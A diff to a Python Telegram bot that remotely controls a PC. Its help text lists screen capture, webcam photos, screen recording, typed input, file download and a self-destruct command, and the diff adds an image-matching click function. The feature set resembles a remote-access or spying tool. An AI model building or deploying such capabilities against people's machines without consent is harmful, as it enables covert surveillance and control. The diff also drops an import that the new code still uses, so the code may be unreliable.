@@ -1,11 +1,9 @@
 # Стандартные библиотеки
-import ctypes
 import getpass
-import os
 import platform
 import shutil
 import socket
-import sys
+import time
 from datetime import datetime
 from io import StringIO
 from subprocess import Popen, PIPE
@@ -77,6 +75,7 @@ def get_start_message():
         "/capture_pc — Сделать скриншот экрана\n"
         "/video_pc <sec> — Сделать запись экрана\n"
         "/capture_webcam — Сделать фото с веб-камеры\n"
+        "/click_image — Кликает на место которое на фото(перед этим нужно это фото отправить)\n"
         "/wallpaper <путь или URL> — Установить обои на рабочий стол\n\n"
         "🔍 Информация о системе\n"
         "/ip_info — Показать IP и геолокацию\n"
@@ -105,7 +104,8 @@ def get_start_message():
         "/msg_box <текст> — Показать сообщение на экране\n"
         "/message_write \"текст\" — Ввести текст в активное поле\n\n"
         "⚠️ Опасные команды\n"
-        "/self_destruct — Запрос на удаление бота\n"
+        "/self_destruct — Запрос на удаление бота\n\n"
+        "Можно отправить файл боту и он его скачает"
     )
 
 
@@ -166,6 +166,24 @@ def capture_pc():
     path = os.path.join(LOG_DIR, 'screenshot.jpg')
     screenshot.save(path)
     return path, f"🖱️ Координаты курсора: ({cursor_x}, {cursor_y})"
+
+
+def click_image(confidence=0.9):
+    """
+    Ищет изображение на экране и кликает по нему
+    """
+    try:
+        time.sleep(0.5)
+        image_path = os.path.join(SCRIPTS_DIR, 'CLICK.png')
+
+        location = pyautogui.locateCenterOnScreen(image_path, confidence=confidence)
+        if location is None:
+            return f"Изображение '{image_path}' не найдено"
+
+        pyautogui.click(location)
+        return f"Клик выполнен по изображению '{image_path}'"
+    except:
+        return f"Изображение не найдено"
 
 
 def record_screen(duration_seconds=60):
